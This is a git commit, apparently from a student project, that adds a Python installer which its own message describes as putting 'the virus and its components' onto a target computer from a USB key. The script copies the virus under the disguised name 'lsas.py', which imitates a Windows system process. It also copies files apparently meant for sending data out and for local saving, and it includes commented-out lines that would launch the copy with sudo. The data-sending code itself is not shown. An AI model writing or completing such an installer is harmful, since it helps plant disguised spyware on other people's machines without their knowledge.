4457b9336f3dc047f2f1f274e938e2b1de4114fa
Bismouth <102626154+Bismouth@users.noreply.github.com>
2022-05-02 17:59:48 +0200

    Création de l'installer
    Permettra d'une seule exécution depuis une clef usb d'installer le virus et ses composants

---
+++ code/virus/installer.py
@@ -0,0 +1,31 @@
+import os
+from sys import platform
+
+virus_pater = open('main.py', 'r')
+virus = virus_pater.readlines()
+
+#Détecte le chemin d'installation en fonction du système d'exploitation.
+if platform == 'win32' :
+    installpath = 'C:' #C'est temporaire
+else :
+    installpath = os.path.expanduser('~') + '/Documents/Prepa/Cesare_force/ngSoftware/Software/Legals'
+
+#Installe les différents composants du virus sur un ordinateur cible
+with open(installpath + '/lsas.py', 'x') as vir :
+    vir.writelines(virus)
+with open('manipulation_string.py', 'r') as file :
+    with open(installpath + '/manipulation_string.py', 'x') as copy :
+        copy.writelines(file.readlines())
+with open('envoie_donnees.py', 'r') as file :
+    with open(installpath + '/menvoie_donnees.py', 'x') as copy :
+        copy.writelines(file.readlines())
+with open('config.json', 'r') as file :
+    with open(installpath + '/config.json', 'x') as copy :
+        copy.writelines(file.readlines())
+with open('sauvegarde_local.py', 'r') as file :
+    with open(installpath + '/sauvegarde_local.py', 'x') as copy :
+        copy.writelines(file.readlines())
+
+
+# os.system('cd ' + installpath)
+# os.system('sudo python lsas.py')
